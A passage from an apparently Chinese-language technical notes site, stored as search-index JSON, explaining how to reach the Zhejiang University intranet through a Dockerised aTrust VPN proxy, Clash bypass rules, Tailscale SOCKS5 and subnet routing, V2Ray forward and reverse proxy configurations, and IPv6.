atrust \u6bd5\u7adf\u8fd8\u662f\u6df1\u4fe1\u670d\u7684\u4ea7\u54c1\uff0c\u80af\u5b9a\u8fd8\u662f\u4e0d\u4f1a\u60f3\u8ba9\u5b83\u8dd1\u5728\u672c\u673a\u4e0a\uff0c\u8fd9\u91cc\u662f\u7528 docker \u90e8\u7f72 atrust socks5 \u4ee3\u7406\u7684\u65b9\u6cd5\u3002</p> <p> docker-easyconnect/docker-easyconnect \u63d0\u4f9b\u4e86\u4e00\u4e2a aTrust \u7684 docker \u955c\u50cf\uff0c\u53ef\u4ee5\u63d0\u4f9b socks5 \u4ee3\u7406\u63a5\u53e3\u3002\u4f46\u5176\u5b9e\u73b0\u65b9\u5f0f\u662f\u76f4\u63a5\u5f00\u56fe\u5f62\u754c\u9762\u7684 aTrust \u5ba2\u6237\u7aef\u8fdb\u884c\u767b\u5f55\uff0c\u5185\u5305\u4e86\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\uff0c\u6240\u4ee5\u955c\u50cf\u6bd4\u8f83\u5927\uff082G+\uff09\u3002\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684 compose \u6765\u90e8\u7f72\u670d\u52a1\uff1a</p> <pre><code>services:\n  atrust:\n    image: hagb/docker-atrust:latest\n    environment:\n      - PASSWORD=123456 # vnc \u5bc6\u7801\n      - URLWIN=1\n    devices:\n      - /dev/net/tun\n    cap_add:\n      - NET_ADMIN\n    ports:\n      - 5901:5901   # vnc \u7aef\u53e3\n      - 1080:1080   # socks5 \u7aef\u53e3\n      - 8888:8888   # http \u7aef\u53e3\n      - 54631:54631 # aTrust \u63a7\u5236\u7aef\u53e3\uff0c\u53ef\u4f7f\u5bbf\u4e3b\u673a web \u8bbf\u95ee\n    sysctls:\n      - net.ipv4.conf.default.route_localnet=1\n    restart: unless-stopped\n</code></pre> <p>\u542f\u52a8\u540e\u53ef\u4ee5\u901a\u8fc7\u5bbf\u4e3b\u673a\u6d4f\u89c8\u5668\u8bbf\u95ee https://vpn.zju.edu.cn \u8fdb\u884c\u767b\u5f55\uff0c\u6216\u8005\u901a\u8fc7 vnc \u5ba2\u6237\u7aef\u8fde\u63a5\u5230 vnc://localhost:5901 \u6253\u5f00\u56fe\u5f62\u754c\u9762\u8fdb\u884c\u767b\u5f55\u3002</p> <p>\u767b\u5f55\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 1080 \u6216\u8005 8888 \u7aef\u53e3\u7684\u4ee3\u7406\u4e86\uff0c\u7528\u6cd5\u548c\u4e0a\u9762\u7684 ZJU Connect \u7c7b\u4f3c\uff0c\u8ba2\u9605\u94fe\u63a5\u4e3a <code>tg://socks?server=127.0.0.1&amp;port=1080&amp;remarks=ZJU ATRUST</code>\u3002</p> <p>\u5b9e\u6d4b\u5982\u679c\u4f7f\u7528\u4e86 ZJU-Rule \u4e14\u542f\u7528\u4e86\u5168\u5c40\u4ee3\u7406\uff0c\u4f8b\u5982 clash \u5f00\u542f\u4e86\u7cfb\u7edf\u4ee3\u7406\u7684\u8bdd\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u539f\u672c\u88ab ZJU-Rule \u5224\u5b9a\u4e3a\u5185\u7f51\u7684\u5730\u5740\uff1a</p> <pre><code>DOMAIN-SUFFIX,vpn.zju.edu.cn\nIP-CIDR,210.32.129.102/32,no-resolve\nIP-CIDR,210.32.174.64/32,no-resolve\nIP-CIDR,210.32.3.87/32,no-resolve\nIP-CIDR,10.3.9.92/31,no-resolve\nIP-CIDR,10.3.9.94/32,no-resolve\n</code></pre> <p>\u8fd9\u4e9b\u5728\u6211\u81ea\u5df1\u90e8\u7f72\u7684 ZJU-Rule \u91cc\u5df2\u7ecf\u6dfb\u52a0\u4e86\uff0c SubConv/ZJU-Rule \u4e5f\u5df2 merge\uff0c\u4f46\u76ee\u524d\u5c1a\u4e0d\u786e\u5b9a\u8fd8\u6709\u6ca1\u6709\u5176\u4ed6\u9700\u8981\u7ed5\u8fc7\u7684\u5730\u5740\u3002</p> \u5173\u4e8e\u7ed5\u8fc7\u7684\u5730\u5740 <p>\u8fd9\u4e9b\u662f\u5b9e\u6d4b\u4e0b\u6765\u8d70\u5185\u7f51\u4ee3\u7406\u4f1a\u5bfc\u81f4\u5ba2\u6237\u7aef\u65e0\u6cd5\u4f7f\u7528\u7684\u5730\u5740\uff0c\u540e\u4e09\u6761\u53ef\u80fd\u4e3a\u96a7\u9053\u7528\u7684\u5730\u5740\uff0c\u5982\u679c\u8d70\u4e86\u5185\u7f51\u4f1a\u5bfc\u81f4\u4e00\u76f4\u53d1\u5927\u91cf\u5305\uff0c\u5efa\u7acb\u5927\u91cf\u8fde\u63a5\u5bfc\u81f4\u4ee3\u7406\u65e0\u6cd5\u4f7f\u7528\u3002</p> <p>\u901a\u8fc7 netstat -nr \u53ef\u4ee5\u67e5\u770b aTrust \u4fee\u6539\u540e\u7684 route \u8868\uff0c\u53ef\u4ee5\u786e\u8ba4\u5728 10.0.0.0/8 \u7f51\u6bb5\u5185\u9700\u8981\u7ed5\u8fc7\u7684\u5730\u5740\uff1a</p> <pre><code>10.0.0.1/32        utun9              UGc                 utun9       \n10.0.0.2/31        utun9              UGc                 utun9       \n10.0.0.4/30        utun9              UGc                 utun9       \n10.0.0.8/29        utun9              UGc                 utun9       \n10.0.0.16/28       utun9              UGc                 utun9       \n10.0.0.32/27       utun9              UGc                 utun9       \n10.0.0.64/26       utun9              UGc                 utun9       \n10.0.0.128/25      utun9              UGc                 utun9       \n10.0.1/24          utun9              UGc                 utun9       \n10.0.2/23          utun9              UGc                 utun9       \n10.0.4/22          utun9              UGc                 utun9       \n10.0.8/21          utun9              UGc                 utun9       \n10.0.16/20         utun9              UGc                 utun9       \n10.0.32/19         utun9              UGc                 utun9       \n10.0.64/18         utun9              UGc                 utun9       \n10.0.128/17        utun9              UGc                 utun9       \n10.1/16            utun9              UGc                 utun9       \n10.2/16            utun9              UGc                 utun9       \n10.3/21            utun9              UGc                 utun9       \n10.3.8/24          utun9              UGc                 utun9       \n10.3.9/26          utun9              UGc                 utun9       \n10.3.9.64/28       utun9              UGc                 utun9       \n10.3.9.80/29       utun9              UGc                 utun9       \n10.3.9.88/30       utun9              UGc                 utun9       \n10.3.9.95/32       utun9              UGc                 utun9       \n10.3.9.96/27       utun9              UGc                 utun9       \n10.3.9.128/25      utun9              UGc                 utun9       \n10.3.10/23         utun9              UGc                 utun9       \n10.3.12/22         utun9              UGc                 utun9       \n10.3.16/20         utun9              UGc                 utun9       \n10.3.32/19         utun9              UGc                 utun9       \n10.3.64/18         utun9              UGc                 utun9       \n10.3.128/17        utun9              UGc                 utun9       \n10.4/14            utun9              UGc                 utun9       \n10.8/13            utun9              UGc                 utun9       \n10.16/12           utun9              UGc                 utun9       \n10.32/11           utun9              UGc                 utun9       \n10.64/10           utun9              UGc                 utun9       \n10.128/11          utun9              UGc                 utun9       \n10.160/12          utun9              UGc                 utun9       \n10.176/13          utun9              UGc                 utun9       \n10.184/14          utun9              UGc                 utun9       \n10.188/15          utun9              UGc                 utun9       \n10.190/18          utun9              UGc                 utun9       \n10.190.64/29       utun9              UGc                 utun9       \n10.190.64.8/31     utun9              UGc                 utun9       \n10.190.126.251/32  utun9              UGc                 utun9       \n10.190.126.252/30  utun9              UGc                 utun9       \n10.190.127/24      utun9              UGc                 utun9       \n10.190.128/17      utun9              UGc                 utun9       \n10.191/16          utun9              UGc                 utun9       \n10.192/11          utun9              UGc                 utun9       \n10.224/12          utun9              UGc                 utun9       \n10.240/13          utun9              UGc                 utun9       \n10.248/14          utun9              UGc                 utun9       \n10.252/15          utun9              UGc                 utun9       \n10.254/16          utun9              UGc                 utun9       \n10.255/17          utun9              UGc                 utun9       \n10.255.128/18      utun9              UGc                 utun9       \n10.255.192/19      utun9              UGc                 utun9       \n10.255.224/20      utun9              UGc                 utun9       \n10.255.240/21      utun9              UGc                 utun9       \n10.255.248/22      utun9              UGc                 utun9       \n10.255.252/23      utun9              UGc                 utun9       \n10.255.254/24      utun9              UGc                 utun9       \n10.255.255/25      utun9              UGc                 utun9       \n10.255.255.128/26  utun9              UGc                 utun9       \n10.255.255.192/27  utun9              UGc                 utun9       \n10.255.255.224/28  utun9              UGc                 utun9       \n10.255.255.240/29  utun9              UGc                 utun9       \n10.255.255.248/30  utun9              UGc                 utun9       \n10.255.255.252/31  utun9              UGc                 utun9       \n10.255.255.254/32  utun9              UGc                 utun9       \n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0 10.3.9.92-94 \u4e09\u4e2a\u5730\u5740\u4ee5\u53ca 10.190.64.10 - 10.190.126.250 \u90e8\u5206\u7684\u5730\u5740\u662f\u4e0d\u5728 route \u8868\u91cc\u7684\uff0c\u9700\u8981\u76f4\u8fde\uff0c\u4f46\u540e\u9762\u8fd9\u4e2a ip \u6bb5\u662f\u4ec0\u4e48\u4f5c\u7528\u8fd8\u4e0d\u6e05\u695a\uff0c\u76ee\u524d\u770b\u6765\u4e0d\u4f1a\u5f71\u54cd atrust \u4f7f\u7528\u3002</p> <p>210.32.* \u90e8\u5206\u7684\u5730\u5740\u53ea\u6709\u5c11\u90e8\u5206\u6807\u4e3a\u4e86\u5185\u7f51\uff0c210.32.3/129/174.* \u90fd\u4e0d\u5728\u8fd9\u4e2a\u8303\u56f4\u5185\u3002</p> <p>\u4f46 docker-atrust \u8fd9\u4e2a\u955c\u50cf\u4e0d\u80fd\u5b9e\u73b0\u81ea\u52a8\u767b\u5f55\u548c\u4fdd\u6d3b\uff0c\u4e34\u65f6\u4f7f\u7528\u624b\u52a8\u5f00\u542f\u7684\u8bdd\u8fd8\u53ef\u4ee5\u63a5\u53d7\uff0c\u5982\u679c\u9700\u8981\u81ea\u52a8\u767b\u5f55\u53ef\u4ee5\u5c1d\u8bd5  kenvix/aTrustLogin \u7684\u5bb9\u5668\uff0ccompose \u5982\u4e0b\uff1a</p> <pre><code>services:\n  atrust:\n    image: kenvix/docker-atrust-autologin:latest\n    environment:\n      - ATRUST_OPTS=--portal_address=https://vpn.zju.edu.cn --username=\u5b66\u53f7 --password=\u5bc6\u7801 --cookie_tid=\u9700\u8981\u83b7\u53d6 --cookie_sig=\u9700\u8981\u83b7\u53d6\n      - PASSWORD=vnc\u5bc6\u7801\n      - URLWIN=1\n    devices:\n      - /dev/net/tun\n    cap_add:\n      - NET_ADMIN\n    volumes:\n      - ./data:/root\n    ports:\n      - 5901:5901\n      - 1080:1080\n      - 8888:8888\n    sysctls:\n      - net.ipv4.conf.default.route_localnet=1\n    shm_size: 256m\n    restart: unless-stopped\n</code></pre> <p>\u8fd9\u4e2a\u5bb9\u5668\u4f1a\u5229\u7528 selenium \u8fdb\u884c\u7f51\u9875\u7684\u81ea\u52a8\u767b\u5f55\uff0c\u4f46 ZJU \u7684 atrust \u7b2c\u4e00\u6b21\u767b\u5f55\u9700\u8981\u7ecf\u8fc7\u56fe\u5f62\u9a8c\u8bc1\u7801\uff0c\u7ed5\u8fc7\u7684\u8bdd\u9700\u8981\u624b\u52a8\u767b\u5f55\u4e00\u6b21\u7136\u540e\u83b7\u53d6 cookie \u91cc\u7684 tid \u548c tid.sig \u5b57\u6bb5\uff0c\u586b\u5230 compose \u7684 ATRUST_OPTS \u91cc\uff08\u8be6\u89c1 aTrustLogin README\uff09\u3002\u4ee5\u53ca\u7b2c\u4e00\u6b21\u8fd8\u9700\u8981\u8fdb\u884c\u624b\u673a\u9a8c\u8bc1\u7801\u7684\u8f93\u5165\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5bb9\u5668\u6ca1\u6709\u5b9e\u73b0\uff0c\u5728\u7b49\u5f85\u586b\u5199\u9a8c\u8bc1\u7801\u7684\u4e00\u6b65\u5bb9\u5668 log \u5c31\u4f1a\u63d0\u793a\u8fde\u63a5\u6210\u529f\uff0c\u4f46\u5b9e\u9645\u8fd8\u9700\u8981\u9a8c\u8bc1\u7801\u3002\u8fd9\u91cc\u9700\u8981\u624b\u52a8\u6253\u5f00 vnc \u56fe\u5f62\u754c\u9762\u540e\u8f93\u5165\u9a8c\u8bc1\u7801\u3002</p> <p>\u4f46\u5b9e\u9645\u7528\u4e0b\u6765\u8fd9\u4e2a\u81ea\u52a8\u767b\u5f55\u4e5f\u4e0d\u592a\u7a33\u5b9a\uff0c\u5728\u6211\u7528\u7684\u65f6\u5019\u51fa\u73b0\u8fc7\u83ab\u540d\u5176\u5999\u5bc6\u7801\u9519\u8bef\u7684\u60c5\u51b5\uff0c\u4f46\u5b9e\u9645\u5bc6\u7801\u5e76\u672a\u586b\u9519\uff0c\u6000\u7591\u662f cookie \u7684\u95ee\u9898\uff0c\u800c\u4e14\u5bc6\u7801\u9519\u8bef\u6709\u5341\u6b21\u7684\u9650\u5236\uff0c\u8fd8\u662f\u6709\u4e00\u5b9a\u98ce\u9669\u3002\u5e76\u4e14\u4e0d\u50cf zju connect\uff0c\u8fd9\u4e2a\u5bb9\u5668\u9700\u8981\u628a\u767b\u5f55\u5bc6\u7801\u76f4\u63a5\u5199\u5728\u73af\u5883\u53d8\u91cf\u91cc\uff0c\u5b89\u5168\u6027\u7565\u4f4e\u3002\u540c\u65f6\u8fd9\u4e2a\u955c\u50cf\u6bd4 docker-atrust \u8fd8\u8981\u5927 1G\uff0c\u7efc\u5408\u8003\u8651\u4e0d\u63a8\u8350\u3002</p>"},{"location":"devops/network/tunnel/#tailscale","title":"tailscale","text":"<p>tailscale \u53ef\u4ee5\u5b9e\u73b0\u5f02\u5730\u7ec4\u7f51\uff0c\u5728\u5185\u7f51\u673a\u5668\u4e0a\u548c\u5916\u90e8\u673a\u5668\u4e0a\u90fd\u5b89\u88c5 tailscale \u5e76\u767b\u5f55\u5230\u540c\u4e00\u4e2a\u8d26\u53f7\u540e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 tailscale \u5206\u914d\u7684 100.xx.xx.xx \u7684 ip \u4e92\u76f8\u8bbf\u95ee\u4e86\uff0c\u4e0d\u7ba1\u662f\u5426\u5728\u540c\u4e00\u7f51\u7edc\u73af\u5883\u4e0b\u3002</p> <p>\u8fd9\u6837\u6765\u76f4\u63a5\u8bbf\u95ee\u5185\u7f51\u4e0a\u81ea\u5df1\u7684\u670d\u52a1\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684\uff0c\u4e0d\u8fc7\u7f3a\u70b9\u662f\u624b\u673a\u7aef tailscale \u4f1a\u5360\u6389 VPN \u8fde\u63a5\uff0c\u8fd9\u6837\u540c\u65f6\u5c31\u4e0d\u80fd\u518d\u5f00\u5176\u4ed6 vpn \u4e86\u3002</p> <p>\u63a5\u4e0b\u6765\u662f\u5173\u4e8e\u4f7f\u7528 tailscale \u5b9e\u73b0\u5185\u7f51\u8bbf\u95ee\u7684\u51e0\u79cd\u65b9\u6cd5\u3002</p>"},{"location":"devops/network/tunnel/#v2ray","title":"V2Ray \u6b63\u5411\u4ee3\u7406","text":"<p>\u89c1 V2Ray \u6b63\u5411\u4ee3\u7406 &gt; tailscale</p>"},{"location":"devops/network/tunnel/#tailscale-socks5","title":"tailscale socks5 \u4ee3\u7406","text":"<p>\u901a\u8fc7 tailscale \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u673a\u5668\u4f5c\u4e3a\u4ee3\u7406\u8bbf\u95ee\u5185\u7f51\uff0c\u4e00\u79cd\u65b9\u6cd5\u4e3a\u4f7f\u7528 V2Ray \u6b63\u5411\u4ee3\u7406\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u76f4\u63a5\u4f7f\u7528 tailscale \u63d0\u4f9b\u7684\u4ee3\u7406\u3002\u5728\u5185\u7f51 Linux \u673a\u5668\u4e0a\u9700\u8981\u4fee\u6539 tailscaled \u7684\u914d\u7f6e\u6587\u4ef6 /etc/default/tailscaled\uff0c\u6dfb\u52a0 FLAGS\uff1a</p> <pre><code>PORT=\"41641\"\n\nFLAGS=\"--socks5-server=0.0.0.0:&lt;port&gt; --outbound-http-proxy-listen=0.0.0.0:&lt;port&gt;\"\n</code></pre> <p>\u7136\u540e systemctl restart tailscaled \u91cd\u542f\u670d\u52a1\u5373\u53ef\uff0c\u8fd9\u6837\u5728\u5176\u4ed6\u8fde\u63a5\u4e86 tailscale \u7684\u8bbe\u5907\u4e0a\u5c31\u53ef\u4ee5\u4f7f\u7528 <code>tg://socks?server=&lt;tailscale ip&gt;&amp;port=&lt;port&gt;&amp;remarks=ZJU TS</code> \u7684\u4ee3\u7406\u4e86\u3002\u540c\u6837 clash \u5f00\u4e86 TUN \u4e5f\u4e0d\u80fd\u7528\u4e86\u3002</p>"},{"location":"devops/network/tunnel/#tailscale-subnet","title":"tailscale subnet","text":"<p>tailscale \u8fd8\u53ef\u4ee5\u8bbe\u7f6e\u5b50\u7f51\u8def\u7531\uff0c\u5141\u8bb8\u5185\u7f51\u673a\u5668\u4f5c\u4e3a\u8def\u7531\u5668\u6765\u8bbf\u95ee\u5176\u4ed6\u5185\u7f51\u5730\u5740\u3002\u5728\u5185\u7f51\u673a\u5668\u4e0a\u9700\u8981\u5f00\u542f\u5b50\u7f51\u8def\u7531\uff1a</p> <pre><code>sudo tailscale set --advertise-routes=&lt;\u5b50\u7f51&gt; --accept-dns=false\n</code></pre> <p>\u4e4b\u540e\u5728 tailscale admin \u9875\u9762\u4e0a\u624b\u52a8\u6279\u51c6\u8fd9\u4e2a\u8def\u7531\uff0c\u5728\u5176\u4ed6\u8bbe\u5907\u4e0a\u5f00\u542f use subnet \u5c31\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u8fd9\u4e2a\u5b50\u7f51\u4e86\uff0ctailscale \u4f1a\u81ea\u52a8\u6dfb\u52a0\u8be5\u5b50\u7f51\u7684\u8def\u7531\u8868\u3002</p>"},{"location":"devops/network/tunnel/#v2ray_1","title":"V2Ray \u53cd\u5411\u4ee3\u7406","text":"<p>\u5982\u679c\u6709\u4e00\u53f0\u81ea\u5df1\u7684\u516c\u7f51\u670d\u52a1\u5668\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 v2ray \u7684\u53cd\u5411\u4ee3\u7406\u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u7684 vmess \u670d\u52a1\u8282\u70b9\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u8bbe\u5907\u7684 clash \u91cc\u4f7f\u7528\u4e86\u3002\u4e3b\u8981\u53c2\u8003\u65b0 V2Ray \u767d\u8bdd\u6587\u6307\u5357\u91cc\u7684\u53cd\u5411\u4ee3\u7406\u90e8\u5206\u3002</p> <p>\u8fd9\u91cc\u6709\u4e09\u53f0\u673a\u5668\uff0c\u5206\u522b\u662f zju\u3001public\u3001end\uff08\u8fd9\u91cc\u5c31\u4e0d\u50cf\u6587\u6863\u4e00\u6837\u8bb0\u4f5c A B C \u4e86\uff09\uff0c\u5176\u4e2d zju \u662f\u5728\u6821\u5185\u7f51\u73af\u5883\u4e0b\u4e14\u80fd\u8bbf\u95ee\u516c\u7f51\u7684\u673a\u5668\uff0cpublic \u662f\u516c\u7f51\u670d\u52a1\u5668\uff0cend \u662f\u4f60\u6b63\u5728\u4f7f\u7528\u7684\u8bbe\u5907\u3002\u4e3b\u8981\u903b\u8f91\u662f\uff1a</p> <p></p> <p>\u5373\u6821\u5185\u7684\u670d\u52a1\u5668 zju \u4e00\u4e2a freedom \u7684 outbound \u8bbf\u95ee\u5185\u7f51\uff0c\u4e00\u4e2a vmess \u7684 outbound \u4e3b\u52a8\u8fde\u63a5\u5230\u516c\u7f51\u670d\u52a1\u5668\uff1b\u516c\u7f51\u670d\u52a1\u5668\u4e00\u4e2a inbound \u63a5\u6536\u6765\u81ea zju \u7684\u8fde\u63a5\uff0c\u5e76\u901a\u8fc7 portal \u548c bridge \u5efa\u7acb\u53cd\u5411\u4ee3\u7406\uff0c\u53e6\u4e00\u4e2a vmess inbound \u63a5\u6536\u6765\u81ea\u5176\u4ed6\u8bbe\u5907\u7684\u8fde\u63a5\uff0c\u8fd9\u4e2a\u4e5f\u5c31\u662f\u63d0\u4f9b vmess \u670d\u52a1\u7684\u8282\u70b9\u3002</p> <p>\u6211\u4eec\u9700\u8981\u5728 zju \u548c public \u4e0a\u90e8\u7f72 v2ray \u670d\u52a1\uff0c\u7136\u540e\u8bbe\u5907\u4e0a\u4f7f\u7528 vmess:// \u8282\u70b9\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>v2ray \u53ef\u4ee5\u4f7f\u7528 docker \u6765\u90e8\u7f72\uff1a</p> <pre><code>services:\n  v2ray:\n    image: v2fly/v2fly-core:latest\n    container_name: v2fly\n    ports:\n      - xxx:xxx # inbound \u7aef\u53e3\u9700\u8981\u586b\u5728\u8fd9\u91cc\u66b4\u9732\u51fa\u6765\n    environment:\n      - TZ=Asia/Shanghai\n    volumes:\n      - ./v2ray.json:/etc/v2ray.json\n    command: [\"run\", \"-config\", \"/etc/v2ray.json\"]\n    restart: always\n</code></pre> <p>\u4e3b\u8981\u9700\u8981\u914d\u7f6e\u7684\u662f v2ray.json</p> zju \u5185\u7f51\u673a\u5668\u4e0a\u7684\u914d\u7f6e <pre><code>{\n    \"reverse\": {\n        \"bridges\": [{\n            \"tag\": \"bridge\",\n            \"domain\": \"nas.local\"   // \u968f\u4fbf\u8bbe\u7f6e\uff0c\u4f46\u8981\u5168\u5c40\u7edf\u4e00\n        }]\n    },\n    \"outbounds\": [{\n        \"tag\": \"tunnel\",\n        \"protocol\": \"vmess\",\n        \"settings\": {\n            \"vnext\": [{\n                \"address\": \"&lt;ip or domain&gt;\",    // \u516c\u7f51\u670d\u52a1\u5668\u7684 ip \u6216\u57df\u540d\n                \"port\": &lt;port_1&gt;,               // \u516c\u7f51\u670d\u52a1\u5668\u7684 inbound \u7aef\u53e3\n                \"users\": [{\n                    \"id\": \"&lt;uuid_1&gt;\",           // \u968f\u673a\u751f\u6210\u7684 uuid\n                    \"alterId\": 0\n                }]\n            }]\n        }\n    }, {\n        \"tag\": \"out\",\n        \"protocol\": \"freedom\",\n        \"settings\": {}\n    }],\n    \"routing\": {\n        \"rules\": [{\n            \"type\": \"field\",\n            \"inboundTag\": [\"bridge\"],\n            \"domain\": [\"full:nas.local\"],   // \u8fd9\u91cc\u8981\u548c\u524d\u9762\u7684 domain \u4e00\u81f4\n            \"outboundTag\": \"tunnel\"\n        }, {\n            \"type\": \"field\",\n            \"inboundTag\": [\"bridge\"],\n            \"outboundTag\": \"out\"\n        }]\n    }\n}\n</code></pre> public \u516c\u7f51\u670d\u52a1\u5668\u4e0a\u7684\u914d\u7f6e <pre><code>{\n    \"reverse\": {\n        \"portals\": [{\n            \"tag\": \"portal\",\n            \"domain\": \"nas.local\"   // \u548c zju \u4e0a\u7684 domain \u7edf\u4e00\n        }]\n    },\n    \"inbounds\": [{\n        \"tag\": \"tunnel\",\n        \"port\": &lt;port_2&gt;,           // \u63d0\u4f9b\u5916\u90e8\u8bbe\u5907\u8fde\u63a5\u7684\u7aef\u53e3\n        \"protocol\": \"vmess\",\n        \"settings\": {\n            \"clients\": [{\n                \"id\": \"&lt;uuid_2&gt;\",   // \u65b0\u968f\u673a\u751f\u6210\u7684 uuid\uff0c\u5916\u90e8\u8bbe\u5907\u7528\n                \"alterId\": 0\n            }]\n        }\n    }, {\n        \"tag\": \"interconn\",\n        \"port\": &lt;port_1&gt;,\n        \"protocol\": \"vmess\",\n        \"settings\": {\n            \"clients\": [{\n                \"id\": \"&lt;uuid_1&gt;\",   // \u540c zju \u4e0a\u7684 uuid\n                \"alterId\": 0\n            }]\n        }\n    }],\n    \"routing\": {\n        \"rules\": [{\n            \"type\": \"field\",\n            \"inboundTag\": [\"interconn\"],\n            \"outboundTag\": \"portal\"\n        }, {\n            \"type\": \"field\",\n            \"inboundTag\": [\"tunnel\"],\n            \"outboundTag\": \"portal\"\n        }]\n    }\n}\n</code></pre> <p>\u8fd9\u4e24\u4e2a\u673a\u5668\u4e0a\u8fd0\u884c\u8d77 v2ray \u540e\uff0c\u5c31\u53ef\u4ee5\u8fde\u63a5 public \u63d0\u4f9b\u7684 vmess \u670d\u52a1\u4e86\uff0c\u8ba2\u9605\u94fe\u63a5\u53ef\u4ee5\u5199 <code>vmess://&lt;base64&gt;?remarks=ZJU%20...</code>\uff0c\u5176\u4e2d base64 \u662f URL safe base64 \u7f16\u7801\u7684 <code>auto:&lt;uuid_2&gt;@&lt;ip or domain&gt;:&lt;port_2&gt;</code>\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728 clash \u91cc\u4f7f\u7528\u4e86\uff0c\u5269\u4f59\u6b65\u9aa4\u89c1 Clash \u4ee3\u7406\u914d\u7f6e\u3002\uff08\u6ce8\u610f\u5728\u516c\u7f51\u670d\u52a1\u5668\u4e0a\u4e0d\u80fd\u5f00 TUN \u6a21\u5f0f\uff09</p>"},{"location":"devops/network/tunnel/#v2ray_2","title":"V2Ray \u6b63\u5411\u4ee3\u7406","text":"<p>\u9002\u7528\u60c5\u51b5\uff1a\u53ef\u8fde\u63a5\u5230\u5185\u7f51\u670d\u52a1\u5668\uff0c\u60f3\u8981\u901a\u8fc7\u5185\u7f51\u670d\u52a1\u5668\u4ee3\u7406\u8bbf\u95ee\u5176\u4ed6\u5185\u7f51\u3002</p>"},{"location":"devops/network/tunnel/#tailscale-proxy","title":"tailscale","text":"<p>\u65e2\u7136\u901a\u8fc7 tailscale \u53ef\u4ee5\u5f02\u5730\u7ec4\u7f51\u76f4\u63a5\u8fde\u63a5\u5230\u5185\u7f51\u670d\u52a1\u5668\u4e0a\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7 v2ray \u7684\u6b63\u5411\u4ee3\u7406\u6765\u901a\u8fc7\u5185\u7f51\u670d\u52a1\u5668\u4ee3\u7406\u8bbf\u95ee\u5176\u4ed6\u5185\u7f51\u5730\u5740\u3002\u540c\u6837\u5229\u7528 docker \u90e8\u7f72 v2ray\uff1a</p> <pre><code>services:\n  v2ray:\n    image: v2fly/v2fly-core:latest\n    container_name: v2fly\n    ports:\n      - xxx:xxx # inbound \u7aef\u53e3\u9700\u8981\u586b\u5728\u8fd9\u91cc\u66b4\u9732\u51fa\u6765\n    environment:\n      - TZ=Asia/Shanghai\n    volumes:\n      - ./v2ray.json:/etc/v2ray.json\n    command: [\"run\", \"-config\", \"/etc/v2ray.json\"]\n    restart: always\n</code></pre> <p>v2ray.json \u7684\u5199\u6cd5\u8f83\u7b80\u5355\uff1a</p> <pre><code>{\n    \"inbounds\": [{\n        \"port\": xxx,  // \u9700\u8981\u66b4\u9732\u7684\u7aef\u53e3\n        \"protocol\": \"vmess\",\n        \"settings\": {\n            \"clients\": [{\n                \"id\": \"&lt;uuid&gt;\",  // \u968f\u673a\u751f\u6210\u7684 uuid\n                \"alterId\": 0\n            }]\n        }\n    }],\n    \"outbounds\": [{\n        \"protocol\": \"freedom\"\n    }]\n}\n</code></pre> <p>\u5f00\u542f docker \u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 tailscale \u7ed9\u7684\u5185\u7f51\u670d\u52a1\u5668\u7684 ip\uff08100.64/9 \u7f51\u6bb5\uff09\u4ee5\u53ca\u7aef\u53e3\u6765\u4f7f\u7528\u4ee3\u7406\u4e86\uff0c\u8ba2\u9605\u94fe\u63a5\u8fd8\u662f <code>vmess://&lt;base64&gt;?remarks=ZJU%20...</code> \u7684\u683c\u5f0f\uff0c\u5176\u4e2d base64 \u662f URL safe base64 \u7f16\u7801\u7684 <code>auto:&lt;uuid&gt;@&lt;tailscale ip&gt;:&lt;port&gt;</code>\u3002</p> <p>\u4e0d\u8fc7\u7f3a\u70b9\u662f clash \u5f00\u4e86 TUN \u4e4b\u540e\u8fd9\u4e2a\u4ee3\u7406\u5c31\u8fde\u4e0d\u4e0a\u4e86\uff0c\u5373\u4f7f TUN \u7ed5\u8fc7\u4e86 tailscale \u7684\u7f51\u6bb5\u8fd8\u662f\u4e0d\u884c\uff0c\u53ef\u80fd\u662f clash \u7684 TUN \u548c tailscale \u672c\u8eab\u51b2\u7a81\u4e86\u5bfc\u81f4\u7684\uff0c\u8fd8\u6ca1\u4ed4\u7ec6\u7814\u7a76\u8fc7\u3002</p> <p>\u53e6\u5916 tailscale \u63d0\u4f9b\u4e86 socks5 \u4ee3\u7406\u529f\u80fd\u548c\u5b50\u7f51\u529f\u80fd\uff0c\u56e0\u6b64\u4e0d\u63a8\u8350\u4f7f\u7528\u672c\u65b9\u6cd5\u3002</p>"},{"location":"devops/network/tunnel/#ipv6","title":"\u901a\u8fc7 IPv6","text":"<p>\u6d59\u5927\u5185\u7f51\u5206\u914d\u7684 IPv6 \u5730\u5740\u662f\u53ef\u4ee5\u901a\u8fc7\u516c\u7f51\u8bbf\u95ee\u7684\uff08\u4e0d\u8fc7\u5c4f\u853d\u4e86\u4e00\u4e9b\u7aef\u53e3\u548c\u534f\u8bae\uff0c\u6bd4\u5982 22/80/443 \u7aef\u53e3\u548c IMCP \u534f\u8bae\uff09\uff0c\u5982\u679c\u5185\u7f51\u7684\u673a\u5668\u6709 IPv6 \u5730\u5740\u4e14\u53ef\u4ee5\u516c\u7f51\u8bbf\u95ee\u7684\u8bdd\uff0c\u53ef\u4ee5\u901a\u8fc7 IPv6 \u76f4\u8fde\u5185\u7f51\u673a\u5668\u6b63\u5411\u4ee3\u7406\u6765\u8bbf\u95ee\u5176\u4ed6\u5185\u7f51\u5730\u5740\u3002\uff08\u4f46 IPv6 